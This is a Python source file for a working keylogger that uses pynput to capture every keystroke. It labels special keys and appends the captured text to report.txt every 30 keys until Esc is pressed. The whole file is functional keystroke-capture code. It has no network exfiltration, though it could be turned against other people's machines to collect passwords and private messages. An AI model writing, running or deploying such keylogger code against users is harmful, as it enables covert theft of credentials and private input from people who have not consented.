from string import printable
from unittest import FunctionTestCase
from pynput.keyboard import Key, Listener
import os
import time

SPECIAL_KEYS = {Key.enter : '\n', Key.tab : '\t', Key.space : ' ', 
                Key.shift : " (SHIFT) ", Key.cmd : " (CMD) ", 
                Key.insert : " (insert) ", Key.ctrl : " (CTRL) "}
BUFFER = list()
PREVIOUS_KEY = None
REPORT_COUNTER = 0

def report():
    global BUFFER
    global REPORT_COUNTER

    with open("report.txt", "a") as file:
        file.write("".join(BUFFER))
    BUFFER = []
    REPORT_COUNTER = 0



# When key is pressed
def on_press(key):
    global BUFFER
    global SPECIAL_KEYS
    global PREVIOUS_KEY
    global REPORT_COUNTER

    try:
        BUFFER.append(key.char)    
    
    except AttributeError: 
        if key in SPECIAL_KEYS:
            BUFFER.append(SPECIAL_KEYS.get(key)) 
        elif key == Key.backspace and len(BUFFER) > 0:
            del BUFFER[-1]
        elif key == Key.esc:
            return False
    PREVIOUS_KEY = key
    REPORT_COUNTER += 1
    if REPORT_COUNTER == 30:
        report()

# When key is released
def on_release(key):
    pass


# Start listener
if __name__ == '__main__':
    keyboardListener = Listener(on_press=on_press, on_release=on_release)
    keyboardListener.start()
    keyboardListener.join()